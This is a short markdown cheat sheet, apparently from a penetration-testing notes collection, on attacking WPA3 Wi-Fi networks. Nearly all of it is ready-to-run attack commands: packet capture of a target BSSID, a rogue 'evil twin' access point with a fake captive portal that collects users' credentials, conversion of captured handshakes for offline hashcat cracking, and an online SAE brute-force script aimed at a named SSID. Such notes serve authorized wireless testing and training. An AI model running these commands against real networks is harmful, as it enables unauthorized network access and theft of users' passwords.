#wifi #wpa3 #sae #owe #evil-twin

# Attacking WPA3

OWE/SAE recon, evil twins, SAE brute-force. Related: [evil-twin](evil-twin.md) · [password-cracking](password-cracking.md) · [tools](tools.md)

## Recon (OWE & SAE)
```bash
sudo airodump-ng --bssid a6:89:f8:b8:78 -c 1 -w OWE wlan0mon
```
Capture a specific BSSID to a file.

```
(wlan.fc.type == 0) && (wlan.fc.type_subtype == 0x08)
```
Wireshark filter for beacon frames.

```
eapol or ((wlan.fc.type == 00) && (wlan.fc.type_subtype == 0x00) or (wlan.fc.type_subtype == 0x01))
```
Wireshark filter for EAPOL + association frames.

## Evil Twin (OWE/SAE)
```bash
sudo hostapd hostapd.conf
```
Start a rogue AP.

```bash
python2 nagaw.py -i wlan1 -o wlan2 -t demo
```
Fake captive portal forwarding wlan1→wlan2. See [captive-portals](captive-portals.md).

```bash
sudo dnsmasq -C dnsmasq.conf -d
```
Serve DNS/DHCP for the rogue AP (enable `ip_forward` first).

## Brute-Force (SAE)
```bash
hcxpcapngtool -o hash WPA-01.cap
```
Convert a captured handshake to a crackable hash.

```bash
hashcat -m 22000 hash /opt/wordlist.txt
```
Offline crack. See [password-cracking](password-cracking.md).

```bash
sudo python3 wacker.py --interface wlan0 --wordlist wordlist.txt --ssid HackMe --freq 2412 --bssid D8:D6:3D:EA:27:D3
```
Online WPA3-SAE brute-force (split the wordlist with `split.sh` for parallelism).
